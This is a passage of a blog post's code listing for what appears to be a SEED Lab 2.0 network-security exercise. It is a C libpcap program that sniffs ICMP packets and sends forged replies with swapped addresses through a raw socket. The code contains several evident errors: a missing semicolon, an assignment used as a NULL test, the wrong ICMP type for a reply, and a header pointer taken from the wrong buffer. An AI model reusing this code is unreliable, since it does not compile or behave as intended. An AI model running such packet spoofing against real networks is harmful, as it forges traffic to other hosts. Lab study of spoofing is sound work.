icmp_chksum;</span><br><span class="line">    u_short icmp_n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args,<span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,<span class="type">const</span> u_char *packet)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_payload</span><span class="params">(<span class="type">const</span> u_char *payload ,<span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex_ascill_line</span><span class="params">(<span class="type">const</span> u_char *payload,<span class="type">int</span> len,<span class="type">int</span> offset)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_banner</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_usage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_banner</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>,APP_NAME,APP_DESC);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,APP_COPYRIGHT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,APP_DISCLAIMER);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_app_usage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [interface]\n&quot;</span>,APP_NAME);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; interface listen on &lt;interface&gt; for packets. \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex_ascill_line</span><span class="params">(<span class="type">const</span> u_char *payload,<span class="type">int</span> len,<span class="type">int</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> gap;</span><br><span class="line">    <span class="type">const</span> u_char *ch;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%05d &quot;</span>,offset);</span><br><span class="line">    ch = payload;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>,*ch);</span><br><span class="line">        ch++;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">7</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">16</span>)&#123;</span><br><span class="line">        gap = <span class="number">16</span>-len;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;gap;i++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    ch =payload;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isprint</span>(*ch))</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*ch);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        ch++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_payload</span><span class="params">(<span class="type">const</span> u_char *payload ,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len_rem = len;</span><br><span class="line">    <span class="type">int</span> line_width = <span class="number">16</span>;</span><br><span class="line">    <span class="type">int</span> line_len;</span><br><span class="line">    <span class="type">int</span> offset=<span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> u_char *ch = payload;</span><br><span class="line">    <span class="keyword">if</span> (len&lt;=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(len &lt;=line_width)</span><br><span class="line">    &#123;</span><br><span class="line">        print_hex_ascill_line(ch,len,offset);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( ; ; )&#123;</span><br><span class="line">        line_len = line_width % len_rem;</span><br><span class="line">        print_hex_ascill_line(ch,line_len,offset);</span><br><span class="line">        len_rem = len_rem - line_len;</span><br><span class="line">        ch = ch+ line_len;</span><br><span class="line">        offset = offset + line_width;</span><br><span class="line">        <span class="keyword">if</span>(len_rem &lt;= line_width)&#123;</span><br><span class="line">            print_hex_ascill_line(ch,len_rem,offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_icmpreply</span><span class="params">(u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span> *<span class="title">old_ip_header</span>;</span></span><br><span class="line">    old_ip_header = (<span class="keyword">struct</span> sniff_ip *)(packet + SIZE_ETHERNET);</span><br><span class="line">    <span class="type">int</span> ip_len = ntohs(old_ip_header-&gt;ip_len);</span><br><span class="line">    <span class="type">char</span> buf[ip_len];</span><br><span class="line">    bzero(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,(packet + SIZE_ETHERNET),<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="type">char</span> *ptr = buf;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span> *<span class="title">ip_header</span> =</span> (<span class="keyword">struct</span> sniff_ip*)(ptr);</span><br><span class="line">    <span class="type">int</span> size_ip_header = IP_HL(ip_header)*<span class="number">4</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sniff_icmp</span> *<span class="title">icmp_header</span>;</span></span><br><span class="line">    icmp_header = (<span class="keyword">struct</span> sniff_icmp*)(packet +size_ip_header);</span><br><span class="line">    icmp_header-&gt;icmp_type = <span class="number">8</span>;</span><br><span class="line">    icmp_header-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">    icmp_header-&gt;icmp_n =<span class="number">0</span> ;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">tempAddress</span> =</span> ip_header-&gt;ip_dst;</span><br><span class="line">    ip_header-&gt;ip_dst = ip_header-&gt;ip_src;</span><br><span class="line">    ip_header-&gt;ip_src = tempAddress;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dst</span>;</span></span><br><span class="line">    dst.sin_family = AF_INET;</span><br><span class="line">    inet_pton(AF_INET,inet_ntoa(ip_header-&gt;ip_dst),&amp;dst.sin_addr.s_addr);</span><br><span class="line">    dst.sin_port = htons(<span class="number">0</span>);</span><br><span class="line">    icmp_header-&gt;icmp_n ++ ;</span><br><span class="line">    <span class="type">int</span> one = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    s = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);</span><br><span class="line">    setsockopt(s,IPPROTO_IP,IP_HDRINCL,&amp;one,<span class="keyword">sizeof</span>(one));</span><br><span class="line">    sendto(s,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>,(<span class="keyword">struct</span> sockaddr *)&amp;dst ,<span class="keyword">sizeof</span>(dst));</span><br><span class="line">    close(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args,<span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,<span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ethernet</span> *<span class="title">ethernet</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_ip</span> *<span class="title">ip</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sniff_tcp</span> *<span class="title">tcp</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *payload;</span><br><span class="line">    <span class="type">int</span> size_ip;</span><br><span class="line">    <span class="type">int</span> size_tcp;</span><br><span class="line">    <span class="type">int</span> size_payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Packet number %d: \n&quot;</span>,count);</span><br><span class="line">    count++;</span><br><span class="line">    ethernet = (<span class="keyword">struct</span> sniff_ethernet*)(packet);</span><br><span class="line">    ip = (<span class="keyword">struct</span> sniff_ip*)(packet + SIZE_ETHERNET);</span><br><span class="line">    size_ip = IP_HL(ip)*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size_ip&lt;<span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; *Invalid IP header length : %u bytes \n&quot;</span>,size_ip);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; From: %s\n&quot;</span>, inet_ntoa(ip-&gt;ip_src));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; To: %s\n&quot;</span>, inet_ntoa(ip-&gt;ip_dst));</span><br><span class="line">    <span class="keyword">switch</span>(ip-&gt;ip_p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_TCP:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: TCP\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_UDP:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: UDP\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> IPPROTO_ICMP:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: ICMP\n&quot;</span>);</span><br><span class="line">            send_icmpreply(packet);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; Protocol: others\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tcp = (<span class="keyword">struct</span> sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);</span><br><span class="line">    size_tcp = TH_OFF(tcp)*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size_tcp &lt; <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; *Invalid TCP header length : %u bytes \n&quot;</span>,size_tcp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; Src port: %d\n&quot;</span>,ntohs(tcp-&gt;th_sport));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; Dst port: %d\n&quot;</span>,ntohs(tcp-&gt;th_dport));</span><br><span class="line">    payload = (u_char*)(packet + SIZE_ETHERNET +size_ip + size_tcp);</span><br><span class="line">    size_payload = ntohs(ip-&gt;ip_len) - size_ip - size_tcp;</span><br><span class="line">    <span class="keyword">if</span> ( size_payload &gt;<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; Payload (%d bytes):\n&quot;</span>,size_payload);</span><br><span class="line">        print_payload(payload,size_payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *dev = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="type">pcap_t</span> *handle;</span><br><span class="line">    <span class="type">char</span> filter_exp[] = <span class="string">&quot;icmp&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">    bpf_u_int32 mask;</span><br><span class="line">    bpf_u_int32 net;</span><br><span class="line">    <span class="type">int</span> num_packets = <span class="number">100</span>;</span><br><span class="line">    print_app_banner();</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">2</span> )&#123;</span><br><span class="line">        dev = argv[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error:unrecongnized command_line options\n\n&quot;</span> );</span><br><span class="line">        print_app_usage();</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dev = pcap_lookupdev(errbuf);</span><br><span class="line">        <span class="keyword">if</span>(dev = <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t find default device: %s\n&quot;</span>,errbuf);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pcap_lookupnet(dev,&amp;net,&amp;mask,errbuf) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t get netmask for device %s: %s\n&quot;</span>,dev,errbuf);</span><br><span class="line">        net = <span class="number">0</span>;</span><br><span class="line">        mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Device: %s\n&quot;</span>,dev);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of packets: %d\n&quot;</span>,num_packets);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Filter expression: %s\n&quot;</span>,filter_exp);</span><br><span class="line">    handle = pcap_open_live(dev,SNAP_LEN,<span class="number">1</span>,<span class="number">1000</span>,errbuf);</span><br><span class="line">    <span class="keyword">if</span>(handle == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t open device %s : %s\n&quot;</span>,dev,errbuf);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pcap_datalink(handle) != DLT_EN10MB)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s is not an Ethernet\n&quot;</span>,dev);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pcap_compile(handle,&amp;fp,filter_exp,<span class="number">0</span>,net) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t parse filter %s : %s\n&quot;</span>,filter_exp,pcap_geterr(handle));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pcap_setfilter(handle,&amp;fp) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Couldn&#x27;t install filter %s : %s\n&quot;</span>,filter_exp,pcap_geterr(handle));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    pcap_loop(handle,num_packets,got_packet,<span class="literal">NULL</span>);</span><br><span class="line">    pcap_freecode(&amp;fp);</span><br><span class="line">    pcap_close(handle);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Capture complete. \n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
</search>
